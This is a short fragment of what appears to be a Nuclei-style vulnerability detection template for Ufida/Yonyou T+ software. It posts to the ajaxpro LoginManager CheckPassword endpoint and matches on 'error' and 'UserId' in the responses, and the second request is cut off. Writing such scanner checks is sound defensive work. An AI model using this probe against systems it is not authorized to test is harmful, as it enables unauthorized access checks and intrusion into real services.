http:
    - cookie-reuse: true
      matchers:
        - condition: and
          dsl:
            - status_code_1 == 200 && contains((body_1), 'error')
            - status_code_2 == 200 && contains((body_2), 'UserId')
          type: dsl
      raw:
        - |
          POST /tplus/ajaxpro/Ufida.T.SM.Login.UIP.LoginManager,Ufida.T.SM.Login.UIP.ashx?method=CheckPassword HTTP/1.1
